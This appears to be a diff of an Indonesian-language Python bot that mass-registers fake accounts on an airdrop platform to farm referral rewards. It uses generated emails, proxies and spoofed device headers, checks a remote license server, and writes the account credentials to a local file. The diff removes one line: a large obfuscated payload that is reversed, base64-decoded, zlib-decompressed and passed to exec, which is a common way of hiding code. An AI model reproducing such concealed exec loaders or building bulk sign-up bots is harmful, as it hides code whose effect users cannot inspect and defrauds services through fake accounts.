@@ -1,1 +1,503 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==wI+HzZD8/v3z//LbF4Hf9zEP9V33joyZxcD2x8WTdG38Ln6b6/m/Awt6RcGm3LEVzt9smu/TRQE0xpAIRqBIHBnBMGYF0IQuFvVeJ1+Dm9+0MPm8ZM7kijuJFz61RKOmOgupE/jvzjV79ovbsakt2nsF+UKdjXPmdFqnTPEoJPdO6diX/2WBpghRMDyS0LoyXVjxbEAClEHUOmEKcNhYeOUjR+uF/7je7bisVum1wfw3KSM+LDxuy5WMmhKGQd6qZopv7zabJ1xCQob4Xd15uaX/b4Hepcm9F+7BrOG6EM9neXZ3/kT1ALegyTzvAdCqdD4uMHolJ9FD6NWTwUVdi/iyjj5mc8QTalhWcCfy8oknltYejqdnRrCEbKWCEWJhcw2sxQ2w3yz6hW/JRQXd7eWWY8snt6biKaLRjEbocG8HyfOi26lAG80A3pnUbKpBo9FCPq8Hnm155cRQ7Th0pSxjNbW2WzZS+TTnPGgmD5AebgRtP3xQjvFcx8+Aggj0X8NO6/2tV1cKDf6PsKPTODZFguw1uS668s8INXwgzIdTNz9nv8U7OzI/1a0WzdT8YffRkTdtNvCYC8YbEBjz/BzpkaRqe5DO3xbCuV8ddJwW055l9j5fbppdm2jbSIUbqR6Eys1M4/n5lMHy3vUurW4RgbCyoKEznKMRVx6D/gN5KTdiSPXtXRKPMWutHqCJgoKcLXPLM9l4HiQ75AdSagXZS5pEOqQgw4kcsFU0kwVQMAVjQ69269gzyfprsb0cQSjj0pP8S5DSDEVMDAaDrTrcpaC/fD1+Rhzns93syqJT6M47mzUPV0h63Fgon4jIf470hv9x4pFP6+a2SwcqR2sScu8jG0Am9ovpwa+58GjTJW9KshyWclOuJODZFCa7ywxIzQ73PyzVqOe1llB9shqz2rcoW/ynI/Axb/+cDTR/h5RMjvUgpzpguGum7i41GiAGTeez16ojMsrLFQnn8ZeNZ16b853ri2DKT0AITGJnBG8az4R0vVE/3E49zFDvB4I9ei+hlcngf4MjhTS92UrInM2ltZe7CWnQECz52n2yImR5Vx4meGVOx7Zu+i/KN6p7dGiYu53p00hDqnU7Ct8hMem0PLxpNl++TBgUSCyY1I+yAAdADRM9FXeeImc9J521FIMDkahyhSWdHsZwciwCle1cb/+tFZRQJRLxe3NWuS0m4oIQTDN9wtwwVDvns+63mA+dZSxOD/aRmgS71Sv6QyLMlTVziT6H4e7O5/dGQ7v09zdY45sl/lfWqFpPK2X0/beyJDmTrmFoWKw36rfsU3GPO3ad/uwnpBUJ4XvWwTtTy9haeR7/Op8ze0CzL23HLJIS/HRuo6MzhVePOVKj9Z92maYyU0tzXMqy1fNyHsvyfAesQAgFclJPgM2+8iMMMleOF4PnzAyUUrhe+q/PCYVyD744tImRNNteGBKqBwtjKD+rxlnV3g27jRatt+PDzbeYI0ujqSbb41aqtX5gJCCCeERYOSrqm5QjbrhZQKRByP37fRVRwLrrCcTCpdyQwkSi2BfOYxzDw8ezVk+GAXKz4ItBSPniUGRAoQy8jUtVviEsnnOk4BTOnUX9arnvemDhpCzV+g4Pc6w4Lu6BVIo/s0L/wKQJ0hReGyBb/b/ZRUsAVh66DBQJnpQgbb/QqBCqtx13cvWbPYansV2pXdH3T2ngEK18cwTDhg3ENWLk/rzyLejwdFHP3wlo4hDKbZgUCUKjKHSpk8RCbrVZO4CrHM80B4xYAhJE3x9BMtzOJvjVQ5QeCqApK5mj4I+7re+MCB95RGyK9AFeaGlIdgc339TDrI3OXJj8fihLqR/2spjAwOqbvzmBT6MFufKiKzG9m4Wr/39t/ZUUTaRc3bNfY9UbLYDYD8xwMgzoL9mds1Z79F0DqG8553aTtlBQZ0NTgjGAOgppBdVpc7brk3smsCX+SvNU9LUp4jDoA+RD1/K4cOtieu8Afs0kK6/jaJbKYBbM/HPPuBm30H/YyEfCdUaUiS8s15CAu8A9WRnAOIwJNSrRCcY3jxXwkvvFPXi8G2wX6xoBkTnVGxxjZC/hjMC/HLiSQBgDZF/fgngGciR3NAY0Tmwc9+z9yyg7LGHKQevQz7tJSzEGsnM2W/NCDCl2Xmpe9lQp7WhOIlnkfM3zC7smwp9IcQt284LPTMfnmiexuaVPO1w5NOOjOP9wayM7DqYynWnqoztSEVMtrdYeI9JUimbdIRrisiCBYJjgwKVwmxJcrIScKcdE/c7Or2qlq3md2cQLQv25tfdWa4z4t8IsnXpphnmQ8U7CXG2lguRnDjbrz3iEFzzcejs8I7X23k7mGL+dCRaJbTyGUJQf1xvOzZTjkpIX1/gvfsUYCwZF9r32GqXUvBdFudOM72D2cZ3DU7EsSk/9RhiJdGBcEjdvNSWfWEdVlVa/NRmO83fU/hmY5/qBgHN8S0K5tJ+12B19flXmNmiVRpbF2PfBOSfiWAEvpoloqgH1I39u2Jb6ndD8HijhdC0V4s+eXqoigObIPkPZIjw67E/GoZOCR1/YuNRgdtgi6PL+HUo/U3a+QY6zzf69xgwaT6ppSkJdhXe//DAAw1GsK75gmpbUMtyjZ6KPgVWbI5DFHCzBfNLB6ylYZsDZ5ZlZI0KqvGPvBuwUgCJNe4QsA7g8LrissCNfWaUt3d3MKpz+kPSUo+2BMELI7Edlq+UsB3F9B+vLW0Uy9otVLnvl8m3LL8U96+qhvlYX5u5W4HZzgH4CWEerYn7dtmP5lH9tRGKdZMEduhuxckk/0lp4RgT3iscjmFAyrYMMq4arIWVXGCafZD7HvV5aRuQH75Z91iBYiGvu3iLzx4jRH6gOpHLppF8tW7feBYyhx5d8/fXt0ULo+trfup3y5lkDgHmA2hB6xTUW7ttc8civ/13LI3hQaAq8nIfKGnyKRbQHtsDD4fv9amFzAz7UhyE+tqH4Me2V8nzg/UfCUwPVtwOLxXyqSy0jx3OPiHfxuGXXnvvOgqWI7LXwr6C8pgXzIoNgqUH81EGU8ReSV30lZfOZMoctGk0hlLpZBXlnGxjMsYGksN5n665kWID48HiGzrUT6p6II3yOoIAOB3NSTFu/8n2FDfsA6OyKwDW8GsHRR4WbDZbgr8VzutTifaAvI/wWUtk2uaq+iNS+kJEJXVPB6azKdT58ZviBIJsrMs+vSto3j9QwhghaNAqFX1sejEyDwt5bnnUmMtoLtxe0sOA/76w32kaFBEwd57gwspN3BSyNBmUYcAFrRtykGYKyTKQPMOrhpnfcAmH6FEJQ2a0CApWL/nOVoUWHIFJMvzBe7VIR2P4R9bNGT8YFpLUUA6oFocy59yj6atjPvLwUHOGslXYMzOJYapE4KQcGPpApgWaiGotxf1h9ZCfRCS51FY8R3wi5O+mGLKEHaFs3UajR7x1okc+TcxehkG5xLdYR5HbjtMiT35im0ZdQFDzTho++nLomSBu761hqtjJrrwMhmd29/WcJ9itnSqPxun8UvzTX85WKdnx9UdaUHSpt+8VcWcst2XYlCRS5RHRF2DUhaCYsY4LN9HtiJvfQwLEA8h1UJc12ZWVHkrw8d2NbT8MtOgqCjMWYg2SKIcDPl9BoIQkPnsjf1V2ZSBY4S5O7jcED7Wg+AD7JDxKZV7RKg5unH4cIQVU5uedWO1QsJlgZQHpOAkRq9DCDGDe6WOgmaBqORdL6djmA999bu0KbrkdgGEpCH5UZzWg9V7Xfs7iA+r8rOHAj6LW21bIFluNNCi32KJi3xE5n0HG/O+CqqDW4IYwfbAMXAEdJm0pX2ZVAHtNeXOMpuDj8B6zGybURo4XBG6D+pCZ5N33h+BmW5DoS1F+QEFTWSnVccRR5+b/4gFP32AnNFKCuTlvfA8kLEulMaKKXbi+YvyRG9/xlTaDhmQXO/fe9O8SVypCDHeXuVzhk3iWyPZ+5KE9PndIU2LqUwdaQjZginYxy+1YwkBS6Viq4yzQPLunpkNq/0RDFlvdMVkTKWkwFbaICrNLirazqxUVnt9GTtjkXaa38QD19QtuTypgrV5BkzrkUZD1qLG67DHK4TR5NNmU9oW/RxsPBTn6BveluKhnSf4SXU1zfgHgV9bZlxsY98F5MQjhw/5A4ygoRwTGcF0He7qTElhecurT00S4Fzainh66MKWUPQCzknlWgsBa3aIFv38hoJhFo5iX60SK29y7/QXubP/7pea8DVG42ZeYaYb+bAxvzkyulfz15pyGbYfLUViLoW8DgZiSdQ+UY6ufPbIJ+iGxjpNGPmYErGsqV/0v8JpVayl8FSfs57oDBa3IJnC3wT5nMImGzgCSCgvQFZAyV5qWjEM1dZ6LRi9B86a6TuwsmI6Xl2g6+/LrdBXhcn1nama/QIGXDNIz3S/zXvHwfz74X47OyifYaBZ3IE494M/BZ97aq+RPnwBtlTFvoDbc/Bguiwn1K/V3/d0+Huewaj4J71hZ4fdZ2m/qpfY9bPo2Ri1Z0ImwPU1AOHPUnxrhTciOI2ZhUd9PbDBMcIcMXKNYX7ZvknfY/BsqrdDE5CzSDiWNx2L0zK5kRWAhn0Ka8I6hcLugJTXAi5r/wTMyOzyIiwxdb/VMNOm3n8UsN4tLzns6qNx0YL01hBiRNjq5loRUJ9XXK80myXUCem8BhFgZN60uDMxZjxazf73afZJZaCbfly7kLVKHpSkek/MqBXtbvNmQprqoiS65c3mnOMpWnwy/QiLhEqEcL+Z2yuPlMTEqKuPyejEiM7Z8/W9cgbG9/RAX7LSDkXKRdeXOD5sOwmMVWNYcUjlQ5RXhx+gk2HpIDBQEmcqlwLNBkNJLY+ubeMAi5lF+NzfwVgbQdauddZNgdfTg57jFSBbqc9OHWXcR4F3WIfmp3uZsxiLslIcZ6Wnv9Fhu940qt7ZeHO901pJClLiMmfETv9Q1CWLZbOlg7/ptPL3HqF46p/LUIAnBC2KYIlLKy/spmOcqOnYTZwnhO5V12+9Clpav7hN0+/qQ6cDJM6jGMBkj8Tuk77XaWJrYVDkMFVuDdykrgSTY6I8lCQAZOxV9BZ7iUCS08UA9Z6Y0+x2I0IiDsQneqB4KX6q3JqdWXpovu23UBFJG4rSZr0GaW6lGY4XGD8+R1BjbMa8kZwmVVXnn+ZTUZ/KMh0n/1LRjSUn8Nz1JtLn2lftoU+wFrIPPteYWCeysc/nBZjG0n7mPwjlWQOOQ7/8ptOqmqjiX09wHz7kufr6IqumgNs7v1mMDpAqi9HhZkc8nJLv6eF+EqZgGzoR9zI3Wu/fF+ptk+wo0lvAk3D8XMKzZzPIfubfFxUGtGT2NVfh7k6mrBuZUC5pyhynAioQ5YydxzbDNIptjc9wmwSnBn0J8/RzZVSXkC1SEuxJE5/ZnbOqk6j+R+/KFlosxE9dqLtyHfQnHEY1asgTWoLaBjo8hWPCzc+I0LHofan703ulblg++E6URw4LyhpdxxSdmfVyOqc65uBcNyD1v7JR6+9Bi/3noQtaVnoZePo7qI9KmEYiK/T2qLrxJnw5CnUfl60gxznshTN+6SiZL3BFTGP3+fj8gQPx/4MeTA1NfIeztFN8kGAqI58tULAapvyhmZd9oe6W7n0DgqzoamTtOrOCejM5hvhPEqAFj/im+zgdmKi25L1cGSgybHSlf8yRzMS0ca8Z+hMH0zVu7xvz6WymLXIomm6R/80m0VeyO7MgXIvUr7U9C9fnO2pfDTYYl7Iq7dTCKwFvd6p4shp7UzMfhwljLz+FiLp9XyjaS5TaMADXzNWIun3JMA3SkXfIkFV85QrRK3IfHzusQRCtP4dRnSGP1xUmjmhH+flGFAwhi7KayLp7VyTy2tW5P8FGzYgRwYsgRrt0q++tsTuIoChsruSA7sHPsZwDzzWXnpqqGXVjRcLAhcN1ZBFcZ21Gz9rSb3QkXvwH+6557KmEC0QamAA1NZS4MYfQzR4RkF+fhddiBFcXHLiwefuCnE+a9fJ8Pd/pe/U6s6v9ZAWCDrfx9y/vZ7j933RAhgaqG6qidUnqQVnJp8LPLVn2LHXZusQcptL2LBXpNIoaIB7ESxhfgnSz+Ic14zyxnS9m4ja3hf8GGjWHJ+4cJlCVVHfHF9Jvl2+WNVGGYRy7A7ojgeyqbb/QG1q4fol7cNwajtkDKS373Gj+M7hbD2ZnArEvb3DCKIPR7DkUgepKQgzk42EVWLDKfr+EH7HiAEH7KHS9ZM66NfHknurx9IuB22q1Bju/9RbNw+tDhvvRits+MKhrlQVn91FYhgYcc85PWGjwT8HWDgKvIDXPd74LvjOoGbeJ7VPA0McmJjI+BDREYZOS2tF3tHtD5UXUkBFpcbY407PLrx5ZMEyCYCbphJno3zbVRRkGrFeMa9dNSPmFb5ffulwE4pjHapJqtGVAfcJY4TYCA/soY87zjcTy/5VnCUH8bA8y2V5opIWoAvDFpAnmfJmVD7X1muwPYX8Wx89I26GtuNescLUYl1Q1J4XKq8+vLOJpsd7/8jVWVlhZY84LqE2tvEjUen88K2YSGBEaKT0nQ3d0Zdx49wOerH5YLk1hZdvNTkkzCjf8DtWcafQvnHzyGi20vgq2kuB9RxG5bBW0m9/K982TS046gTaAZFHkP3VCdyVcgCKAvupQ+mqBcAzkycsQle8xEeobSoflcybp68Xf5W9SYsMZT2achDELnPSpO4s/BkkbMYJmhMPDYgOwPYQX+pxjB9HSlekoU3z2hxl2/x7AbPrJJ8q/algKWc+bm3E3fXAUdaeb8GVK1ghHsmM1gVa9sx5/6R1XaN2zCRlqcw/oSTHw/klvKGWSZOdEQEeGaheW84S4DhffU6UcRIHOElineEatVh/0jG1+hLu/WpD9bo3uxmPMx7yF5ag5R2/zj+6Und7wX9tr3BRN/ALMULiD6u9JOzM+DLUHC6JjhVey8I49d9D0cwXawiAODf6IkzVDHVVfIjKVgeboozpfyMMDzH/uYmIB2h9WLlUfOcwVmjZZOh1F+hNYnPe1SfELl4iHDgGV9GGLMkdsWFRMGuoetx2g7IuIdluoyRUra2PWaVj7bOOzVF6mJfrCCifmGfbZCjCj14CORajO9B7ha4aZTU16hn7rwn7Vwj0XHIevL1fpmMo+iY5/W6MucQevZItcpGx3ZtFVpSD1eUrWKE4rjph9zK/faeHOxMs8ROBPh036C9EheUf6Oxj8cbEUCdwNutmrpKne1KAOCMBtMO2q0daWmwukYNo91lee38tH8Nj+meJ8HkMPfmLFoFP5YHCGWrXboHhPqwIxFI4hnS+9s5jDC91sbPFZpIv/qaixwBVsL1GS2sdRnv/AqoFAzRc0y/O7e4/q1r6QqKdr6tLHt/jxxLjTlSHCuFn4eNN0Ih/dhRwCrGxFSPwvuZE5rGj0w/JGhzOjQu2ObBV8loGq12CrhdkG/ZpXxRAYMzSaGc9U4I83Knbg6dTC7WRFWvrDgbo+rR1vDlNFfXgD471/MJq9UnJcmVr+Y0L3HvqGgVzeKPvDkYVwT0adw6CQD79Ei4FI7KjVh+LOP+oDyyoQT6I0vnyf/lFwki1hApk0SBV4IjPT/iZR+k7Ffbl/pxxvbWpWbrfitdA+rFnhk/wvXzLouEcilrX50o7UwLr27yHO7GYqGxFu5ympFfn1cE9IBDN7WbwZTkux72ziCJVxLjd9yyvSEQMuexKM25ixnM1Kb8EqJ+1qyRi0x4QjWCmufCdQsEzyWyk19mpjd3PD4qe48vORbRqRd4daB3kptRn+SsdNGH3fB8YRu0NFy/3okbRCMIjsiKq/plRq0ca8oPCBc2EAjQdXgFcjLMUx+m8JmLbgvQcFFsEd+aLCHaQEKik0n2mEAO148HX4FGhuwyhCdRtYJUQhQOMk8fDd6ASlU4cNVCQPZ2PKtecK1LAN/kIB1/jenyzdZqnPshjuuqTBoICN58dsZ9Y3oGz5aZjWXFAJ0v3ZBPWZBjGrpo1Hokc2V2V0WNI+bIghenENmk+MAu0KL1j5oT511THuXV0lY0ayMbKT16o8CKnO6Jo8dHsR/rI5WxMsL7GF0NqPSVwSbOWVts5lKK5Y2XfRu07cCZt1Zq6XlpnmgU6YVaZ7dV82eNEnFvGjY9om45PlYK1ht+LzuKDkf38U6kS9ITFKUFZV25jGzTdppqJmpCa8rQuy+h8laP4vT+RJMu/L7m0+S592xbadCiH2ZZ2QLRVmK7LMcnkolUypoMnv5L4+UuSurOlRrY6Bl291wft58KExODfIkp2VCDm8eCdx1sPYJkmCdXcTbxm9fLUSL+kpj61vBVpPJRfNEVmOBXUqitqEL5JQVUq5oOIFufHBCnVgkYDfIFvEbM+cQ7quzIIXuQeeJGP6/rWg9bWBCzu5FyJoQJ+I0JU9Ri4Oxt8i6D0bT45wocOXvaYPqzjVlLz1R3yrrPYVCBBv5ja6ijBhFDsC5K7jLmZq5KqxI4G01rpvKf9DwxPvYTaH6w/3H0c0lZSuouerq1ihB9nhsb6nxFsyBYEMaiQSbeoaOjlk0zNwBmjwkvcIprCGX5P2ji/T3rwk5pZkHzaEsR8E0U5/71dIM0fPwl+mMlxQN9VbSl08Xa301nPfLtpjeNvsVXsMghAHlq32q99zSwnjEreif+8USsQUhsd3O35HuHvwK7epemRLH0UMkaG1kgTrZ47UYpkzipLK6AzlnJOSIxIkVMESQe4u/nbhfeBSvWl6t8jc+zPlsKpg1smr1oJwKJ92XC6ebHz9pHJVCxTXFFCnALwGzPi4znOWny05DZLIHejLf9FmypucKqKnaOchjC+pLAHz+U4lwamSVpX5QK7v3zD7Z9RlO2oPXAcs/KZm1WTJOd+Y2Y70Ww4zod9kjsTJ0ww7/2lXA9XOLjoEeleAVW2tCFrJ9ZkyVXSd0AioYWXba6Q18nj3oIJHCmapzmBiIVpPKUmvWzOpcrxUBD+18h623kzqZrfjOfbtV5PQldBUK66UJGSiHwwE8Uk3NclxCS0URMAbjN7cCWGkHRQCqJMKPEE2p8XSwATk4/2ozOC8OUOyt3kVGTUGXEByfcCwO8JTY3vyE1W8dpJ3B9a44KzhRvnLQyqmadPFTsqDL53URb6kG7OVbzt20gEA1No/F44h6H6IhvnqlqmAfYbfYAU8dHbzTO6nYZ4AkTEO+Z9WtMFt71bJZPAZQmRX299HN66qKflzG9x+w47n05fSrY3WcRH0xygxtVsDSooX3AV93uf9JKgeBciA/5Wj09DZ4lAjA+FAUf4WqRYKhR8vd0Z1Xi79zLydI0lTBeuJlKMO8ly6bIo7Z40xPKkeaCC/KcJAyDvAl7vBOrJK/1gUunYqYrQq5K8yGrNryjc5N23/wWmRlvqAAXpHWz5mEGutUZ+u73ylDxW5FUeZCEoNq+HDxtKNgxpRV8RQVFSIW91NZ3/Y3JHlIPhI263UKHh7ZvKteHzTQ3t5ws8sPkTdcldtxXoNxtSlIOtry5IRqXZHZH0IlDl4QjKKYasLshaCjGTiahRBYoVaLkqwbwPQfIjOedpn5P82Wx0H/W8BafAYtaDixGaNZW5j0O2FzA9wJ96a0LsnMFfTyAXwOIldaZCqW/8f4qYFmAlEyQytkhR0nCtYgXrT7imo1LEi/Zr8O/UdW0/D6YYz6jNbLUhfGeI0uZnlF2gPay2+c/3SMRT+GWzyVKPS0dEQpwaKxP7p7BuzMxvkR8INbbTdOoonIkBORwg5O2s2+g/thv1rRTsCAo3Q7cYpN1fgWF+23B28v/tIV01KruKXVFb/1OSQHLrG2AG3uLVowgjijFKKBJ2b9vTmRg2sHSqmJMQAvvsWxQ65qSrwgQnmZVrPAFZ3XQI5INH6ReXTvpquXzcGkTiKyP4vOxHaGglzAnKXvjDBefAuKlPbFbh1/XlFzDqY4gyi/zKN6ztIHjq4wZhYxlnT2LjyZ1owzM7sFoUbyaCZxPWuE5gDJHUxeQR5xDHscB4kl4upaHFVJdeM9t35prkHV7Zhnb+2E4F26MgPf23ZBjzzQLj2iKnkx4mPMLQUCRpw+GLzSNbgaQLYfemY+VJcbk76OP36ksO3l4g5Yp4it784NpCsgEpEfSF5Ljli47nsJMgtUXN8lrPZ1R8Azf38xWZqbvLUYIsiwODnuVuVFw56EzzQIhFOLTbvwQ9O1yGBagGjU2Kv0gI5E1OeNizgY97VzjdpDXaQkQYz23bhxtPbyUtMzGxzPKfI6+72XS0vuVLNm1MbCWwz9hY3CCf8MSAWZb8hTnKPaK4xiEEdeJXDKGHe3obvDj4PlqpFpr0XojIHm8v28WByDKs/F/7sVlv42vwN3PxEH9MLjIClBWasxYabkz96Wck+iZWjqeClx/JMn6HXXcP7HN0oL8tC3L6o1/sqgOot5Fh/R1eQDOTBDI0p/aDuBLHtiHuoJMv1S/DiKI6r3S4F8kc8B76FzCUrfslt8JYKgMhjQewkkTRzZlVrBvoUYnPkR8qpLTDZVHJvfsBFd4H6wUwVKfat05cQuzNa7G97QzeNH86XH9JbLhFd1a45MKG6LVMnRS71VTDwN9br0WcyjjgEFo5K4inlvvonTO0skyVAD6qbg5mNqQccEuaHoOLWc4mVNhBFsONoPO1BkKJ/rboLc9J63xi79jIHZFysV+5ur9nUF0kXnCns6hqZmySXn96VU5BMoQcMjnFfhFfOpeBaXDPD68LP/p54y7Ltq8vTOgBPkb7DDXwVgTzbuZGE0+MiOM4qJUsmgW+Rqc+mkY0Rm0yy4p7T20P3FKO+qn3OHkU3oxNWXrXxP5FhkIwEjLUlIQGMVj/XJnAiynTZsZ8CYbiPwUxIHohtmQb5vj+gJ2pLikuS7vwMNIhA8zcrEgv63wsgSmsbghxcjNeXwAsOxgnig84yREfhFR1DNl/9NrqhHRg8w3w2rdLh+5erYFVBThCUBa3hkHz8wl03gApkrKTwIMWMVR90CUBp5bBk+UsuFcouYxswBK70hPk3SOAURXUBR/IFmBMHxdXFrKFJ0D09tss7vK8giMKpiPtlAP3mG5Uy13JsrpupQofV+Ng/1Go0kIuk+D/ptsyx8ScNSvxMU1dYUwuDXZbKUeptk/4BFC1ZB/5AKEee+fBHQYPJc4nA+Fs25VSeY3X2PHhKMRvt3fiBoN2ajBipv8jAsbPaOfP2CrEL9xDkGF8sTriboPFB4E3KYCvl7ZUwM5hO9AZ9yoNRPiVbtXhFzr+HSJzTmJNyPYGXzLj9SmI50JgMZeXwPkhe0a1nHNcrfTm7oV/cxGDkQdKf8w2IRTNoSbqWaEfCJnV/U2yo1g072vugH5FxT7U47cY1GPG2htjKwS/cRo02oe9W7b1UxxqrKU2dhMiLLMZ9qxgxCgLnH+7YFiyrMtVh8sAvQAZQ+lYYqdXL5MAXdgdk1aEfluvEnfd9VK/t1m7owXl1JpzuROag9GoONtd9jLZn4jZYTAsyknJ6z+6yb7xsIjzfglQmxsJB8Y8pDRssvt6dzREdolIu6uD69aDyC9eSc9bSQu/DDQ60c7CIzu2ekZ7A54WeIUfj8A3MwRCX9OlJ49ZkW8KMPzwFwCYXTHnBBRIqyQR/2nYLOvminttppaDp12W+KJlOTZad6vHCPlmBVsSBX0lEx/pr8/Ndh5cQK4a2l3BsMfyehljMiJ62FZ8ABqD0YMk54XRWg1FpbmPqSpjfI/UcMic9zD+xaYIsxTCISN3Va8gLHSJpTBPBkLQxdR7zLfK6aZZvCB/P1Q4GYbcw6Wu0m3vfB6ACbF28y9YX/auHkPntIw19ntHD5n3sZrJTeG9y37nZUgmq72qp0vOpQ4JNYVpa8ZmzyLs2qSIfg3QdpQbTAfOSZLF9s6Lynppd5ksQLGnx0qMUQKUWfYXhug7WVPeSr788tU+NV9TWir1KOMYFPZDUS+13A4LA2z+ud7l2+/glMX/NZApvVNWG/QbG0sxqQ7qL4n0mYvGwQkrFRO+NuvbSV0ic7SxvrNBBSJHN80lnWEdcJNIbUpkQNmSakwzpNzl6b0nYHhMSx1DVGzRHW5MiqFdsn03d3aUmZd+5720lmGmmrQIPO2mQHcmfq9DF1QmRUxVwgJVbYzu3rZ6YJ9yZKepHIglU6rV4ka2JdcixnsuiHkgFiZFfI38JraCx4sWHUG6QZqgwfAsB2OHatMdrpFwX9dqx0QHF47JsgNCDIYMD2msiOl9NOFbs1uiwq1cnoBik4RS/AVl5ESdgnHnsCeeMaPf5jMmle8TGB3oXIBC8vVEACgwNmrkR2Ph/J//ffz///kPl5n0IcYOsYFkSb+qPvv+53B3r7EsrivGc0slnn/TR2q4gyWsmdwJe'))
+import requests
+import json
+import time
+import re
+from bs4 import BeautifulSoup
+import random
+import string
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+from rich.console import Console
+from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
+from rich import print as rprint
+from rich.panel import Panel
+from rich.text import Text
+from datetime import datetime, timedelta
+from functools import partial
+import threading
+import queue
+from concurrent.futures import ThreadPoolExecutor
+from api.proxy_handler import ProxyHandler
+from api.header import create_random_device_info, get_random_headers
+from api.names import indonesian_names
+from api.register import OasisRegister
+from api.providers import create_providers as create_providers_util
+from api.providers import run_providers as run_providers_util
+
+def clear():
+    import os
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def key_bot():
+    api = "https://itbaarts.com/api_prem.json"
+    try:
+        response = requests.get(api)
+        response.raise_for_status()
+        try:
+            data = response.json()
+            header = data['header']
+            print('\033[96m' + header + '\033[0m')
+        except json.JSONDecodeError:
+            print('\033[96m' + response.text + '\033[0m')
+    except requests.RequestException as e:
+        print('\033[96m' + f"Failed to load header: {e}" + '\033[0m')
+
+def create_styled_console():
+    return Console(highlight=False)
+
+def print_status(message, status="info"):
+    status_styles = {
+        "success": "bold green",
+        "error": "bold red",
+        "info": "bold cyan",
+        "warning": "bold yellow"
+    }
+    style = status_styles.get(status, "white")
+    rprint(f"[{style}]{message}[/{style}]")
+
+def create_progress():
+    return Progress(
+        SpinnerColumn(),
+        TextColumn("[progress.description]{task.description}"),
+        transient=True,
+        expand=False
+    )
+
+def print_progress(current, total):
+    """Fungsi untuk menampilkan progress yang lebih sederhana"""
+    percentage = (current / total) * 100
+    print(f"\n[+] Progress: {current}/{total} ({percentage:.0f}%)")
+
+def save_account(email, password, username_password):
+    """Menyimpan akun ke file accounts.txt dan update referral count"""
+    try:
+        with open('accounts.txt', 'a') as f:
+            f.write(f"{email}|{password}\n")
+        print(f"[+] Akun berhasil disimpan ke accounts.txt")
+        
+        # Update referral count setelah berhasil menyimpan
+        total_reff, max_reff = update_referral_count(username_password)
+        if total_reff is not None:
+            remaining = max_reff - total_reff
+            print(f"[+] Sisa referral: {remaining}")
+            
+    except Exception as e:
+        print(f"[-] Error saat menyimpan akun: {str(e)}")
+
+def generate_password(email):
+    """Generate password dari username email"""
+    username = email.split('@')[0]
+    # Kapitalisasi huruf pertama dan tambahkan @ di akhir
+    return f"{username[0].upper()}{username[1:]}@"
+
+def create_spinner():
+    """Membuat spinner tanpa memerlukan deskripsi"""
+    return Progress(
+        SpinnerColumn(style="cyan"),
+        TextColumn("[cyan]{task.description}"),
+        transient=True,
+        expand=False
+    )
+
+def get_passwords():
+    """Mengambil daftar password dari server"""
+    try:
+        response = requests.get('https://airdrop.itbaarts.com/password.php')
+        if response.ok:
+            passwords = {}
+            for line in response.text.strip().split():
+                if '|' in line:
+                    username, date = line.split('|')
+                    passwords[username] = date
+            return passwords
+        return None
+    except:
+        return None
+
+def verify_password():
+    """Verifikasi password dan tanggal kadaluarsa"""
+    console = create_styled_console()
+    console.print("\n[bold cyan]VERIFIKASI PASSWORD[/bold cyan]")
+    console.print("[cyan]─" * 30 + "[/cyan]\n")
+    
+    passwords = get_passwords()
+    if not passwords:
+        print_status("Gagal mengambil data password dari server", "error")
+        return False, None
+    
+    username = console.input("[bold white]Username : [/bold white]").strip()
+    
+    if username not in passwords:
+        print_status("Username tidak ditemukan", "error")
+        return False, None
+    
+    # Cek tanggal kadaluarsa
+    try:
+        expire_date = datetime.strptime(passwords[username], "%d/%m/%Y").date()
+        today = datetime.now().date()
+        
+        if today > expire_date:
+            print_status(f"Password sudah kadaluarsa pada {passwords[username]}", "error")
+            return False, None
+            
+        print_status("Verifikasi berhasil", "success")
+        return True, username
+        
+    except ValueError:
+        print_status("Format tanggal tidak valid", "error")
+        return False, None
+
+def get_max_referral(password):
+    """Mengambil jumlah maksimal referral yang diizinkan"""
+    try:
+        response = requests.get(f'https://airdrop.itbaarts.com/max_ref.php?password={password}')
+        if response.ok:
+            data = response.text.strip().split('|')
+            if len(data) == 2:
+                total_reff = int(data[0])
+                max_reff = int(data[1])
+                return total_reff, max_reff
+    except:
+        pass
+    return None, None
+
+def update_referral_count(password):
+    """Update jumlah referral setelah registrasi berhasil"""
+    try:
+        response = requests.get(f'https://airdrop.itbaarts.com/max_ref.php?password={password}&change_reff')
+        if response.ok:
+            data = response.text.strip().split('|')
+            if len(data) == 2:
+                total_reff, max_reff = int(data[0]), int(data[1])
+                print(f"[+] Referral count diupdate: {total_reff}/{max_reff}")
+                return total_reff, max_reff
+    except Exception as e:
+        print(f"[-] Gagal update referral count: {str(e)}")
+    return None, None
+
+class RateLimiter:
+    def __init__(self, max_requests=10, time_window=1):
+        self.max_requests = max_requests
+        self.time_window = time_window
+        self.requests = []
+        self.lock = threading.Lock()
+
+    def can_proceed(self):
+        now = datetime.now()
+        with self.lock:
+            # Hapus request yang sudah lewat time window
+            self.requests = [req_time for req_time in self.requests 
+                           if now - req_time < timedelta(seconds=self.time_window)]
+            
+            if len(self.requests) < self.max_requests:
+                self.requests.append(now)
+                return True
+            return False
+
+    def wait_if_needed(self):
+        while not self.can_proceed():
+            time.sleep(0.1)
+
+class ThreadSafeCounter:
+    def __init__(self):
+        self.count = 0
+        self.lock = threading.Lock()
+        
+    def increment(self):
+        with self.lock:
+            self.count += 1
+            return self.count
+            
+    def get_count(self):
+        with self.lock:
+            return self.count
+
+def worker(task_queue, rate_limiter, counter, total_tasks, referral_code, progress_lock, username_password):
+    while True:
+        try:
+            task_id = task_queue.get_nowait()
+        except queue.Empty:
+            break
+
+        current = counter.increment()
+        print(f"\n[+] Processing task {current}/{total_tasks}")
+        
+        rate_limiter.wait_if_needed()
+        oasis = OasisRegister()
+        
+        for attempt in range(3):  # Max 3 attempts per task
+            try:
+                # Generate email
+                email, username, domain = oasis.get_email()
+                if not email:
+                    print_status(f"Task {current}: Gagal generate email", "error")
+                    continue
+                    
+                # Generate password
+                password = generate_password(email)
+                
+                print_status(f"Task {current}: Email    : {email}", "info")
+                print_status(f"Task {current}: Password : {password}", "info")
+                
+                # Register and verify
+                if oasis.register_and_verify(email, password, referral_code):
+                    save_account(email, password, username_password)
+                    print_status(f"Task {current}: Account saved successfully", "success")
+                    break
+                else:
+                    print_status(f"Task {current}: Registration or verification failed", "error")
